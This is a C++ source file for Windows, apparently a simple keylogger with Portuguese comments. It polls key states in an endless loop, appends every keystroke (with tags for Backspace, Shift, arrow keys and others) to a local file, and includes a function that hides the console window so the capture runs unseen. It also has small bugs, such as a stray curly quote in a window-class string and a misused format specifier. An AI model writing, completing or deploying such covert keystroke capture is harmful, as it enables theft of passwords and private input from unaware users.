#include <stdio.h>
#include <ctype.h>
#include <iostream>
#include <windows.h>
#include <stdio.h>

using namespace std;

void Stealth();
int salvar(int tecla, char *file);

int main()
{
	/*
  HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
   */




   char a;

    while(true){

        for(a=65;a<=255;a++){           
		   if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
	//	if(a=='A')
// tolower(a));		
	salvar(tolower(a),"lo.txt");
		//cout<<a<<endl;
		}

    }

    return 0;
}








int salvar(int tecla, char *file){


    FILE *newarquivo;
    newarquivo = fopen(file, "a+");

   // cout << tecla;

 //   fprintf(newarquivo, "%s", &tecla);
	
	if (tecla == 8)
        fprintf(newarquivo, "[bckspc]");
    else if (tecla == 13)
        fprintf(newarquivo, "\n");
   else if (tecla == VK_SPACE)
        fprintf(newarquivo, "[Spc] ");
    else if (tecla == 32)
        fprintf(newarquivo, "%s", " ");
    else if (tecla == VK_TAB)
        fprintf(newarquivo, "\t");
    else if (tecla == VK_SHIFT)
        fprintf(newarquivo, "%s", "[SHIFT]");
    else if (tecla == VK_CONTROL)
        fprintf(newarquivo, "%s", "[CONTROL]");
    else if (tecla == VK_ESCAPE)
        fprintf(newarquivo, "esc");
    else if (tecla == VK_END)
        fprintf(newarquivo, "%s", "[END]");
    else if (tecla == VK_HOME)
        fprintf(newarquivo, "%s", "[HOME]");
    else if (tecla == VK_LEFT)
        fprintf(newarquivo, "%s", "[LEFT]");
    else if (tecla == VK_UP)
        fprintf(newarquivo, "%s", "[UP]");
    else if (tecla == VK_RIGHT)
        fprintf(newarquivo, "%s", "[RIGHT]");
    else if (tecla == VK_DOWN)
        fprintf(newarquivo, "%s", "[DOWN]");
    else if (tecla == 20)
        fprintf(newarquivo, "%s", "[CAPSLOCK]");
    else if (tecla == 190 || tecla == 110)
        fprintf(newarquivo, "%s", ".");
    else
        fprintf(newarquivo, "%s", &tecla);
fclose(newarquivo);

return 0;
}  











void Stealth()
{
  HWND Stealth;
  AllocConsole();
 Stealth = FindWindow("ConsoleWindowClass”", NULL);
  ShowWindow(Stealth,0);

  }
  